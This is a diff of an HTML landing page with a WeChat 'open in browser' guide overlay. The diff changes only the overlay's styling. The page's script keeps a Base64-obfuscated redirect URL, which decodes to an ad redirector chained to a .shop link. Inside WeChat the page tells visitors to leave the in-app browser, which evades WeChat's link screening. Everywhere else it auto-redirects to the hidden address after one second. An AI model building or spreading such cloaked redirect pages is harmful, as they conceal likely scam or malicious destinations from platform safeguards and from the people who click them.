@@ -20,38 +20,37 @@
       backdrop-filter: blur(6px);
       background-color: rgba(0, 0, 0, 0.65);
       z-index: 9999;
-      color: #fff;
       display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 30px;
     }
 
-    .guide-content {
-      max-width: 300px;
+    .guide-box {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      text-align: right;
+      color: #fff;
     }
 
-    .guide-content img {
-      width: 120px;
-      margin-bottom: 20px;
+    .guide-box img {
+      width: 100px;
       animation: bounce 1.5s infinite;
+      margin-bottom: 5px;
     }
 
-    .guide-content h2 {
-      font-size: 20px;
-      margin-bottom: 10px;
+    .guide-box h2 {
+      font-size: 18px;
+      margin: 0 0 5px;
     }
 
-    .guide-content p {
-      font-size: 15px;
+    .guide-box p {
+      font-size: 14px;
+      margin: 0;
       color: #ddd;
     }
 
     @keyframes bounce {
       0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+      50% { transform: translateY(-8px); }
     }
   </style>
 </head>
@@ -59,18 +58,17 @@
 
 <!-- 微信引导层 -->
 <div class="guide-overlay" id="wechatGuide">
-  <div class="guide-content">
+  <div class="guide-box">
     <img src="arrow.png" alt="向上箭头" />
-    <h2>请点击右上角 ···</h2>
-    <p>选择“在浏览器中打开”以继续访问</p>
+    <h2>点击右上角 ···</h2>
+    <p>选择“在浏览器中打开”</p>
   </div>
 </div>
 
 <script>
-  // ✅ 加密后的跳转链接（Base64 编码）
+  // Base64 编码后的跳转链接
   const encodedUrl = "aHR0cDovL2Vhc3RsaW9uYWQuY24vSW5kdGx6eC5odG1sP2h0dHBzOi8vZ2dlcnNjLnNob3AvaUhkZ25YL3dpeXJ1aXdycHUvcnlldQ==";
 
-  // Base64 解码函数，带简单校验
   function safeBase64Decode(encoded) {
     try {
       const decoded = atob(encoded);
@@ -81,7 +79,6 @@
     }
   }
 
-  // 判断是否微信内置浏览器
   function isWeChatBrowser() {
     const ua = navigator.userAgent.toLowerCase();
     return ua.includes("micromessenger");
@@ -92,15 +89,13 @@
     const decodedUrl = safeBase64Decode(encodedUrl);
 
     if (!decodedUrl) {
-      document.body.innerHTML = "<p>跳转地址非法或已损坏。</p>";
+      document.body.innerHTML = "<p>跳转地址无效。</p>";
       return;
     }
 
     if (isWeChatBrowser()) {
-      // 微信中显示引导
-      guide.style.display = "flex";
+      guide.style.display = "block";
     } else {
-      // 非微信中 → 延迟跳转
       setTimeout(() => {
         window.location.href = decodedUrl;
       }, 1000);
